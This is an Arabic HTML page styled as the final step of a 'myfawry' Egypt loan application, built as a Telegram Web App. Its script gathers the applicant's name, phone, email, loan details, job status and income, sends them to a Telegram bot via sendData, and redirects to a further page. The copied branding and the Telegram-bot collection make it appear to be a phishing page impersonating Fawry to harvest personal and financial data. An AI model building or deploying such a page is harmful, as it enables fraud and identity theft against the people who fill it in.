<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>myfawry مصر - طلب التمويل (الملخص)</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --fawry-yellow: #ffc20e;     /* Fawry Signature Yellow/Gold */
            --fawry-yellow-dark: #e0a800;
            --fawry-blue: #003366;       /* Fawry Dark Navy Blue */
            --fawry-blue-dark: #002244;
            --bg-color: #f4f6f9;
            --card-bg: #ffffff;
            --text-main: #1e293b;
            --text-muted: #64748b;
            --input-border: #cbd5e1;
            --btn-gray: #e2e8f0;
            --btn-gray-text: #334155;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Fawry Navigation Header Bar */
        .app-header {
            width: 100%;
            background-color: var(--fawry-blue);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(0, 51, 102, 0.2);
        }

        .back-btn-top {
            color: #ffffff;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            border: none;
            background: transparent;
            padding: 0;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: 900;
            letter-spacing: -0.3px;
            color: #ffffff;
        }

        .header-title .region {
            color: var(--fawry-blue);
            font-size: 11px;
            margin-right: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--fawry-yellow);
            padding: 3px 7px;
            border-radius: 4px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: #ffffff;
            border-radius: 2px;
        }

        /* Card Layout */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 20px;
            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.06);
            border: 1px solid #e2e8f0;
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 24px;
            color: var(--fawry-blue);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
        }

        .subtext {
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 24px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* Step Progress Bar */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 0 auto 32px;
            width: 100%;
        }

        .step-bar {
            flex: 1;
            height: 6px;
            background-color: #e2e8f0;
            border-radius: 3px;
        }

        .step-bar.active {
            background-color: var(--fawry-yellow);
        }

        /* Form Inputs */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 14px;
            font-weight: 700;
            color: var(--fawry-blue);
            margin-bottom: 8px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #111111;
            outline: none;
            width: 100%;
            transition: border-color 0.2s;
        }

        .form-control::placeholder {
            color: #94a3b8;
        }

        .form-control:focus {
            border-color: var(--fawry-blue);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23003366' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: left 16px center;
            background-size: 14px;
            padding-left: 40px;
            cursor: pointer;
        }

        /* Fawry Styled Summary Card */
        .summary-card {
            background-color: #fffdf0;
            border-right: 4px solid var(--fawry-yellow);
            padding: 18px 16px;
            border-radius: 12px;
            margin: 10px 0 24px;
            border-top: 1px solid #f2e3b6;
            border-left: 1px solid #f2e3b6;
            border-bottom: 1px solid #f2e3b6;
        }

        .summary-card h3 {
            margin: 0 0 14px 0;
            font-size: 14px;
            font-weight: 800;
            color: var(--fawry-blue);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px dashed #cbd5e1;
        }

        .summary-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .summary-label {
            color: #475569;
            font-size: 13.5px;
            font-weight: 500;
        }

        .summary-value {
            font-weight: 700;
            font-size: 13.5px;
            color: var(--text-main);
            text-align: left;
            direction: ltr;
        }

        /* Buttons */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #cbd5e1;
        }

        .btn-next {
            background-color: var(--fawry-yellow);
            color: var(--fawry-blue);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s, transform 0.1s;
            box-shadow: 0 4px 14px rgba(255, 194, 14, 0.4);
        }

        .btn-next:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-next:active:not(:disabled) {
            background-color: var(--fawry-yellow-dark);
            transform: scale(0.99);
        }

        /* Footer */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #64748b;
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- myfawry Navigation Header -->
<div class="app-header">
    <button onclick="goBack()" class="back-btn-top">رجوع ←</button>
    <div class="header-title">
        <span>myfawry</span><span class="region">مصر</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">طلب التمويل</h1>
    <div class="subtext">الخطوة 3 من 3</div>

    <!-- Step Progress Indicators -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>

    <!-- Form & Dynamic Summary -->
    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">الوضع المهني</label>
            <select id="jobStatus" class="form-control" required>
                <option value="موظف" selected>موظف / موظفة</option>
                <option value="تاجر / رائد أعمال">تاجر / رائد أعمال</option>
                <option value="موظف حكومي">موظف حكومي</option>
                <option value="طالب">طالب / طالبة</option>
                <option value="آخر">آخر</option>
            </select>
        </div>

        <div class="form-group">
            <label for="income">متوسط الدخل الشهري (جنيه)</label>
            <input type="number" id="income" class="form-control" placeholder="مثال: 15000" min="0" required>
        </div>

        <div class="summary-card">
            <h3>ملخص الطلب</h3>

            <div class="summary-row">
                <span class="summary-label">مبلغ التمويل:</span>
                <span class="summary-value" id="sumAmount">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">مدة التمويل:</span>
                <span class="summary-value" id="sumDuration">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">نوع التمويل:</span>
                <span class="summary-value" id="sumType">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">الغرض من التمويل:</span>
                <span class="summary-value" id="sumPurpose">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">صاحب الطلب:</span>
                <span class="summary-value" id="sumName">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">رقم الهاتف:</span>
                <span class="summary-value" id="sumPhone">--</span>
            </div>
        </div>

        <div class="btn-container">
            <button type="submit" id="btnSubmit" class="btn-next">تأكيد الطلب</button>
            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
        </div>
    </form>
</div>

<!-- Footer -->
<div class="footer-banner">
    © 2026 myfawry Egypt - جميع الحقوق محفوظة لشركة فوري
</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();   
        tg.expand();

        if (tg.BackButton) {
            tg.BackButton.show();
            tg.BackButton.onClick(() => goBack());
        }
    }

    // Retrieve storage items from previous steps
    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('loan_amount') || localStorage.getItem('amount');
    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loan_term') || localStorage.getItem('loanDuration');
    const loanType = localStorage.getItem('appliedLoanType') || localStorage.getItem('loanType');
    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";
    let phone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "";

    // Format Amount in EGP (جنيه)
    if (amount) {
        const rawAmount = String(amount).replace(/\D/g, '');
        const numAmount = Number(rawAmount);
        document.getElementById('sumAmount').innerText = !isNaN(numAmount) && numAmount > 0
            ? `${numAmount.toLocaleString('ar-EG')} EGP` 
            : `${amount} EGP`;
    } else {
        document.getElementById('sumAmount').innerText = "--";
    }

    // Format Egypt Phone Number (+20)
    if (phone) {
        phone = phone.replace(/^\+?20/, '').trim();
        document.getElementById('sumPhone').innerText = `+20 ${phone}`;
    } else {
        document.getElementById('sumPhone').innerText = "--";
    }

    document.getElementById('sumDuration').innerText = term ? (isNaN(term) ? term : `${term} شهرًا`) : "--";
    document.getElementById('sumType').innerText = loanType || "--";
    document.getElementById('sumPurpose').innerText = purpose || "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
};

function submitForm(event) {
    event.preventDefault();
    const tg = window.Telegram?.WebApp;
    const incomeInput = document.getElementById('income');
    const btnSubmit = document.getElementById('btnSubmit');
    const incomeVal = incomeInput.value.trim();

    if (!incomeVal || Number(incomeVal) <= 0) {
        alert("يرجى إدخال دخل شهري صحيح.");
        incomeInput.focus();
        return;
    }

    btnSubmit.disabled = true;
    btnSubmit.innerText = "جاري المعالجة...";

    const data = {
        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('loan_amount') || localStorage.getItem('amount'),
        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loan_term') || localStorage.getItem('loanDuration'),
        loanType: localStorage.getItem('appliedLoanType') || localStorage.getItem('loanType'),
        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        email: localStorage.getItem('email'),
        phone: localStorage.getItem('userPhone') || localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: incomeVal,
        currency: "EGP",
        submittedAt: new Date().toISOString()
    };

    localStorage.setItem('jobStatus', data.jobStatus);
    localStorage.setItem('income', incomeVal);

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 300);
    } else {
        console.log("myfawry Payload:", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
